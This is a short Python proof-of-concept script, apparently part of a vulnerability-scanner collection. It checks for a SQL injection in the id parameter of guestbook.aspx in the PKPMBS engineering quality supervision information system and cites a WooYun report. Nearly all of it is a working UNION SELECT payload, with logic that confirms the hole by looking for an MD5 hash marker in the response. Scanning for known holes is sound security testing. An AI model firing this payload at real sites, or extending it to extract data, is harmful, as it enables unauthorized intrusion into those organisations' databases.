#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: PKPMBS工程质量监督站信息管理系统SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0154499
author: Lucifer
description: PKPMBS guestbook.aspx文件中参数id存在SQL注入漏洞
'''
import sys
import requests
import warnings
def run(url):
        result = ['PKPMBS工程质量监督站信息管理系统SQL注入','','']
        payload = "/guestbook.aspx?do=show&id=1%20union%20all%20select%20null,null,null,null,null,null,null,null,null,null,null,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    